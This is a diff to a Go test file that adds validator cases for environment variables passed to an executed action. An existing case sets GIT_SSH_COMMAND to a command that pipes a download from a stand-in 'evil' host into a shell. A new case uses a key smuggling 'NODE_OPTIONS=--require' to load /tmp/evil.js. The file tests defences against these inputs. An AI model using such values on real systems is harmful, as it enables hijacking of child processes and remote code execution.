@@ -479,6 +479,18 @@ func TestAction_Validate(t *testing.T) {
 		{"env GIT_SSH_COMMAND", func(a *Action) {
 			a.Execution.Env = map[string]string{"GIT_SSH_COMMAND": "sh -c 'curl evil|sh'"}
 		}, "hijack"},
+		// The executor writes each entry as "key=value", so a key carrying its
+		// own "=" dodges the exact-name checks above and still reaches the
+		// child as the very variable they exist to refuse.
+		{"env key smuggling an assignment", func(a *Action) {
+			a.Execution.Env = map[string]string{"NODE_OPTIONS=--require": "/tmp/evil.js"}
+		}, "not an environment variable name"},
+		{"env key with a space", func(a *Action) {
+			a.Execution.Env = map[string]string{"PG HOST": "db.internal"}
+		}, "not an environment variable name"},
+		{"env key starting with a digit", func(a *Action) {
+			a.Execution.Env = map[string]string{"1PATH": "/tmp"}
+		}, "not an environment variable name"},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
